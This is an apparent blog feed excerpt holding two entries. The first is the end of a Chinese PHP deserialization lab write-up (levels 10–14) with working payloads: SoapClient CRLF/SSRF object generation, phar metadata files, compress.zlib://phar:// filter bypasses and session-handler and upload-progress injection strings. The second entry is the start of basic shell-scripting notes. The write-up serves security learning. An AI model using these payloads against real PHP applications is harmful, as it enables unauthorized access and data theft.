class="string">&#x27;pass=password&#x27;</span>;</span><br><span class="line"><span class="variable">$data_len</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;http://192.168.199.177:8080&#x27;</span>=&gt;<span class="string">&#x27;http://192.168.174.143/ser/level10/flag.php&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;admin^^Content-Type: application/x-www-form-urlencoded^^Content-Length: &#x27;</span>.<span class="variable">$data_len</span>.<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_data</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;bbba&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$b</span>);<span class="comment">//将^^改为\r\n</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">#O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22bbba%22%3Bs%3A8%3A%22location%22%3Bs%3A43%3A%22http%3A%2F%2F192.168.174.143%2Fser%2Flevel10%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A91%3A%22admin%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Apass%3Dpassword%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span></span><br></pre></td></tr></table></figure><p>然后直接访问目录下的txt文件即可</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240425145934461.png" alt="image-20240425145934461"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240425145942258.png" alt="image-20240425145942258"></p><h2 id="level11phar反序列化"><a href="#level11phar反序列化" class="headerlink" title="level11phar反序列化"></a>level11phar反序列化</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以先试一下看看常见的文件存不存在</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240425161340203.png" alt="image-20240425161340203"></p><p>目的是echo $flag，然后destruct是要反序列化时才会触发的方法，所以通过md5_file去触发反序列化，由此构造</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后将生成的文件改成图片类型的后缀上传，然后POST参数附上就可以了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240425163542221.png" alt="image-20240425163542221"></p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$boo1</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$black_list</span>=[<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;glob&#x27;</span>,<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;ftp&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;https&#x27;</span>,<span class="string">&#x27;ftps&#x27;</span>,<span class="string">&#x27;phar&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$item</span>)&#123;</span><br><span class="line">    <span class="variable">$front</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$filename</span>,<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$item</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$front</span>==<span class="variable">$item</span>)&#123;</span><br><span class="line">        <span class="variable">$boo1</span>=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>) <span class="keyword">and</span> <span class="variable">$boo1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正常的phar伪协议是不行的</p><p>当phar被过滤的情况下可以使用下列协议实现绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240425183148519.png" alt="image-20240425183148519"></p><p> 由于黑名单上有zip和php所以使用的payload为:</p><blockquote><p>compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;upload&#x2F;test.gif&#x2F;test.txt</p></blockquote><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240425193124264.png" alt="image-20240425193124264"></p><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*hint.php*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable language_">$this</span>-&gt;her=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name===<span class="variable language_">$this</span>-&gt;her)&#123;</span><br><span class="line">            <span class="comment">//绕过这个需要用到引用</span></span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先去hint.php看看线索</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="comment">//#ini_set设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。 设置选择session序列化选择器</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在index.php中就一个Flag类中存在一个__wakeup魔术方法</p><p>方法内形同虚设，相当于触发了方法直接返回flag</p><p>哪触发wakeup需要反序列化，这里没unserialize函数且没有文件上传</p><p>但hint中发现对session是可控的且在hint.php下session的引擎格式是php_serialize</p><p>默认情况下session处理引擎是php</p><p>此外了解一下ini_set这个函数</p><p>ini_set设置php.ini指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</p><p> 也就是说只有在hint.php下时是对session处理的引擎是php_serialize</p><p>其他php文件下还是默认php引擎</p><p>php引擎的存储格式是键名|serialized_string，而php_serialize引擎的存储格式是serialized_string</p><p>当在php_serialize的引擎储存格式下创建session然后处理(验证)session时会把”  |  “当成一个正常的字符。而在php引擎储存格式下处理(验证)同一个session的时会把”  |  “ 当成键与值的分割符然后对分割符后面的值进行反序列化</p><p>所以当我们在自定义session中在序列化语句前加上  |  然后再访问index.php这时，在index.php下服务器验证session的时候因为是php引擎储存格式，所以会对session中  |  后的内容进行反序列化，从而触发了wakeup魔术方法得到flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#highlight_file(__FILE__);</span></span><br><span class="line"><span class="comment">/*hint.php*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable language_">$this</span>-&gt;her=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name===<span class="variable language_">$this</span>-&gt;her)&#123;</span><br><span class="line">            <span class="comment">//绕过这个需要用到引用</span></span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = &amp;<span class="variable">$a</span>-&gt;her;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</span></span><br><span class="line"><span class="comment">#?a=|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240425203402758.png" alt="image-20240425203402758"></p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>php.ini配置</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">session.auto_start</span>=<span class="number">0</span><span class="comment">;</span></span><br><span class="line"><span class="attr">session.serialize_handler</span> = php_serialize<span class="comment">;</span></span><br><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">On</span><span class="comment">;</span></span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">Off</span><span class="comment">;</span></span><br><span class="line"><span class="attr">session.upload_progress.prefix</span> = <span class="string">&quot;upload_progress_&quot;</span><span class="comment">;</span></span><br><span class="line"><span class="attr">session.upload_progress.name</span> = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><span class="comment">;&lt;br&gt;session.upload_progress.freq =  &quot;1%&quot;;</span></span><br><span class="line"><span class="attr">session.upload_progress.min_freq</span> = <span class="string">&quot;1&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;flag&quot;;&#125;</span><br></pre></td></tr></table></figure><p>主要利用的是session.upload_progress.enabled 当该设置为on 的时候，在向服务器上传任意一个文件的时候php会把该上传文件的详细信息(如上传时间，文件名等)储存在session中，而当我们以POST形式传入名为PHP_SESSION_UPLOAD_PROGRESS的变量时，传入的文件名会被储存到session中(也是filename的值赋值到session中)</p><p>原文链接：<a href="https://blog.csdn.net/qq_73767109/article/details/130856442">https://blog.csdn.net/qq_73767109/article/details/130856442</a></p><p><strong>.写一个文件上传的html</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;upload-form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.174.143/ser/level14/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>/&gt;</span></span><br><span class="line">        上传文件…</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>改成html尾缀,这里的变量名一定要是PHP_SESSION_UPLOAD_PROGRESS</p><p><strong>打开html任意上传一个文件并抓包</strong></p><p>修改filename为</p><blockquote><p>|O:4:&quot;test&quot;:1:{s:4:&quot;name&quot;;s:4:&quot;flag&quot;;}</p></blockquote><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240425211118879.png" alt="image-20240425211118879"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240425212308789.png" alt="image-20240425212308789"></p><p>就告一段落了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell笔记</title>
      <link href="/2024/04/12/shell%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/04/12/shell%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章：小试牛刀"><a href="#第一章：小试牛刀" class="headerlink" title="第一章：小试牛刀"></a>第一章：小试牛刀</h1><h2 id="1-1-在终端中显示输出"><a href="#1-1-在终端中显示输出" class="headerlink" title="1.1 在终端中显示输出"></a>1.1 在终端中显示输出</h2><p>​用户是通过终端会话同she1l环境打交道的。如果你使用的是基于图形用户界面的系统，这指的就是终端窗口。如果没有图形用户界面(生产服务器或SSH会话)，那么登录后你看到的就是shell提示符。</p><p>​在终端中显示文本是大多数脚本和实用工具经常需要执行的任务。she1l可以使用多种方法和格式显示文本。</p><h3 id="1-1-1-预备知识"><a href="#1-1-1-预备知识" class="headerlink" title="1.1.1 预备知识"></a>1.1.1 预备知识</h3><p>​命令都是在终端会话中输人并执行的。打开终端时会出现一个提示符。有很多方法可以配置提示符，不过其形式通常如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username@hostname$</span><br><span class="line">[youzipii@localhost ~]$</span><br></pre></td></tr></table></figure><p>或者也可以配置成root@hostname #，或者简单地显示为$或#。</p><p><strong>$表示普通用户，#表示管理员用户root。root是Linux系统中权限最高的用户。</strong></p><p><strong>注意：</strong></p><p>​因为如果shell（root）具备较高的权限，命令中出现的输入错误有可能造成更严重的破坏所以推荐使用普通用户(shel1会在提示符中以s来表明这种身份)登录系统，然后借助sudo这类工具来运行特权命令。使用sudo<command><arguments>执行命令的效果和root一样。</p><p>shell脚本通常以shebang起始:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bahs</span></span><br></pre></td></tr></table></figure><p>​shebang是一个文本行,其中#!位于解释器路径之前。&#x2F;bin&#x2F;bash是Bash的解释器命令路径,bash将以#符号开头的行视为注释。脚本中只有第一行可以使用shebang来定义解释该脚本所使用的解释器。</p><p>脚本的执行方式有两种。</p><p>(1)将脚本名作为命令行参数:</p><p>​bash myScript.sh</p><p>(2)授予脚本执行权限，将其变为可执行文件:</p><p>​chmod 755 myscript.sh</p><p>​.&#x2F;myScript.sh.</p><p>​如果将脚本作为bash的命令行参数来运行，那么就用不着使用shebang了。可以利用shebang来实现脚本的独立运行。可执行脚本使用shebang之后的解释器路径来解释脚本。</p><p>​使用chmoa命令赋予脚本可执行权限:<br>​$ chmod a+x sample.sh</p><p>​该命令使得所有用户可以按照下列方式执行该脚本:</p><p>​$ &#x2F;sample.sh#.&#x2F;表示当前目录<br>或者</p><p>​$ &#x2F;home&#x2F;path&#x2F;sample.sh #使用脚本的完整路径<br>​内核会读取脚本的首行并注意到shebang为#!&#x2F;bin&#x2F;bash。它会识别出&#x2F;bin&#x2F;bash并执行该脚本:<br>​$ &#x2F;bin&#x2F;bash sample.sh<br>​当启动一个交互式she1l时，它会执行一组命令来初始化提示文本、颜色等设置。这组命令来自用户主目录中的脚本文件<del>&#x2F;.bashrc(对于登录shel则是</del>&#x2F;.bash profle)。Bash shell还维护了一个历史记录文件~&#x2F;.bash history，用于保存用户运行过的命令。</p><p>~:表示主目录，通常是&#x2F;home&#x2F;user 其中user是用户名，如果是root则为&#x2F;root</p><p>图形化环境创建的终端不会读取profile或bash_profile（绝大多数情况下），而ssh登陆远程系统时会读取profile。shell使用分号或换行符来分隔单个命令或命令序列。比如：</p><p>$cm1 ; cmd2</p><p>这等同于</p><p>$cmd1</p><p>$cmd2<br>    注释部分以#为起始，一直延续到行尾。注释行通常用于描述代码或是在调试期间禁止执行某行代码·:<br>    #sample.sh-echoes “hello world”<br>    echo “hello world”</p><h3 id="1-1-2-练习"><a href="#1-1-2-练习" class="headerlink" title="1.1.2 练习"></a>1.1.2 练习</h3><p>echo用于终端打印的最基本命令。</p><p>默认情况下，echo在每次调用后会添加一个换行符：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ <span class="built_in">echo</span> <span class="string">&quot;Welcome o bash&quot;</span></span><br><span class="line">Welcome o bash</span><br></pre></td></tr></table></figure><p>​只需要将文本放人双引号中，echo命令就可以将其中的文本在终端中打印出来。类似地不使用双引号也可以得到同样的输出结果.</p><p>​需要注意的是这些方法看起来相似，但各有特定的用途及副作用。双引号允许she1l解释字符串中出现的特殊字符。单引号不会对其做任何解释。</p><p>​如果需要打印像!这样的特殊字符，那就不要将其放入双引号中，而是使用单引号，或是在特殊字符之前加上一个反斜线():但我试了下好像都可以</p><p>​另一个可用于终端打印的命令是printf。该命令使用的参数和C语言中的printf函数一样。<br>例如:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#文件名： printf.sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-5s %-10s %-4s\n&quot;</span> No Name Mark</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-5s %-10s % -4.2f\n&quot;</span> 1 Sarath 80.3456</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412201042680.png" alt="image-20240412201042680"></p><h3 id="1-1-3-工作原理"><a href="#1-1-3-工作原理" class="headerlink" title="1.1.3 工作原理"></a>1.1.3 工作原理</h3><p>​%s、%c、%d和%f都是格式替换符(fommat substitution character )，它们定义了该如何打印后续参数。-5s指明了一个格式为左对齐且宽度为5的字符串替换(-表示左对齐)。如果不指明-,字符串就采用右对齐形式。宽度指定了保留给某个字符串的字符数量。对Name而言，其保留宽度是10。因此，任何Name字段的内容都会被显示在10字符宽的保留区域内，如果内容不足10个字符，余下的则以空格填充。</p><p>​对于浮点数，可以使用其他参数对小数部分进行舍人(round of)。</p><p>​对于Mark字段，我们将其格式化为$-4.2f，其中.2指定保留两位小数。注意，在每行的格式字符串后都有一个换行符(\n )。</p><h3 id="1-1-4-补充内容"><a href="#1-1-4-补充内容" class="headerlink" title="1.1.4 补充内容"></a>1.1.4 补充内容</h3><p>​使用echo和printf的命令选项时，要确保选项出现在命令中的所有字符串之前，否则Bash会将其视为另外一个字符串。</p><ol><li>在echo中转义换行符</li></ol><p>​默认情况下，echo会在输出文本的尾部追加一个换行符。可以使用选项-n来禁止这种行为。echo同样接受双包含转义序列的双引号字符串作为参数。在使用转义序列时，需要使用echo -e”包含转义序列的字符串”这种形式。例如:</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412201415626.png" alt="image-20240412201415626"></p><ol start="2"><li>打印彩色输出</li></ol><p>​脚本可以使用转义序列在终端中生成彩色文本。</p><p>​文本颜色是由对应的色彩码来描述的。其中包括:重置&#x3D;0，黑色&#x3D;30，红色&#x3D;31，绿色&#x3D;32,黄色&#x3D;33，蓝色&#x3D;34，洋红&#x3D;35，青色&#x3D;36，白色&#x3D;37。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412201531119.png" alt="image-20240412201531119"></p><p>​其中\e[1;31m是一个转义字符串，可以将颜色设为红色，\e[0m将颜色重新置回。只需要将31替换成想要的色彩码就可以了。<br>​对于彩色背景，经常使用的颜色码是:重置&#x3D;0，黑色&#x3D;40，红色&#x3D;41，绿色-42，黄色-43蓝色&#x3D;44，洋红&#x3D;45，青色&#x3D;46，白色&#x3D;47。</p><p>​要设置彩色背景的话，可输入如下命令:<br><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412201653480.png" alt="image-20240412201653480"></p><p>这些例子中包含了一些转义序列。可以使用man console_codes来查看相关文档。</p><h2 id="1-2-使用变量与环境变量"><a href="#1-2-使用变量与环境变量" class="headerlink" title="1.2 使用变量与环境变量"></a>1.2 使用变量与环境变量</h2><p>​所有的编程语言都利用变量来存放数据，以备随后使用或修改。和编译型语言不同，大多数脚本语言不要求在创建变量之前声明其类型。用到什么类型就是什么类型。在变量名前面加上一个美元符号就可以访问到变量的值。shell定义了一些变量，用于保存用到的配置信息，比如可用的打印机、搜索路径等。这些变量叫作<strong>环境变量</strong>。</p><h3 id="1-2-1-预备知识"><a href="#1-2-1-预备知识" class="headerlink" title="1.2.1 预备知识"></a>1.2.1 预备知识</h3><p>​变量名由一系列字母、数字和下划线组成，其中不包含空白字符。常用的惯例是在脚本中使用大写字母命名环境变量，使用驼峰命名法或小写字母命名其他变量。</p><p>​所有的应用程序和脚本都可以访问环境变量。可以使用env或printenv命令查看当前shell中所定义的全部环境变量:</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412201913135.png" alt="image-20240412201913135"></p><p>要查看其他进程的环境变量，可以使用如下命令:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /proc/<span class="variable">$PID</span>/environ</span><br></pre></td></tr></table></figure><p>其中，PID是相关进程的进程ID(PID是一个整数)。我们可以使用pgrep或ps -aux | grep 进程名令获得进程ID:</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412202225249.png" alt="image-20240412202225249"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412202332320.png" alt="image-20240412202332320"></p><p>​特殊文件&#x2F;proc&#x2F;PID&#x2F;environ是一个包含环境变量以及对应变量值的列表。每一个变量以name&#x3D;value的形式来描述，彼此之间由null字符(\0)分隔。形式上确实不太易读。</p><p>要想生成一份易读的报表，可以将cat命令的输出通过管道传给tr，将其中的\0替换成\n:<br>    $cat &#x2F;proc&#x2F;5588&#x2F;environ | tr ‘\0’ ‘\n’</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412202522980.png" alt="image-20240412202522980"></p><h3 id="1-2-2-练习"><a href="#1-2-2-练习" class="headerlink" title="1.2.2 练习"></a>1.2.2 